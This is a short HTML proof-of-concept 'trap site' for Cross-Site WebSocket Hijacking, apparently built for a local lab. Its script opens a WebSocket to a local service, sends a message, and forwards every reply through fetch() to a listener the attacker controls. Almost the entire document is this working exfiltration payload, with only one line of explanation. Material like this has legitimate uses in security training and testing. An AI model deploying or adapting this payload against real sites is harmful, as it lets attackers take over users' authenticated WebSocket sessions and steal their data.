<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Cross-Site WebSocket Hijacking (CSWSH)</title>
  </head>
  <body>
    <h3>Trap Site</h3>
    The attacker needs to prepare a listener server in advance.
  <script>
    websocket = new WebSocket('ws://localhost:3000','wstest');
    websocket.onopen = start
    websocket.onmessage = handleReply
    function start(event) {
      websocket.send("attackers-message");
    }
    function handleReply(event) {
      fetch('http://127.0.0.1/CSWSH/', {method:'POST',mode:'no-cors',body:event.data})
    }
  </script>
</body>
</html>
